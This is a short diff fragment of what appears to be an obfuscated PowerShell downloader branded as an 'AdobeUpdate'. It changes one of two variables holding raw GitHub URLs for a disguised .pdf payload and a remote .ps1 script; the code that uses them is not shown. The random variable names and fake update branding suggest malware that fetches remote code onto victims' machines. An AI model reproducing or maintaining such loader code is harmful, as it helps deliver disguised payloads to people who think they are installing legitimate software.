@@ -34,7 +34,7 @@ finally {
 
 
 
-    $lwoxheihwic = "https://raw.githubusercontent.com/burnitup545/AdobeUpdate/main/random.pdf"
+    $lwoxheihwic = "https://raw.githubusercontent.com/burnitup545/AdobeUpdate/main/random2323.pdf"
 
     $osicheuche = 'https://raw.githubusercontent.com/burnitup545/AdobeUpdate/main/lib30.ps1'
 
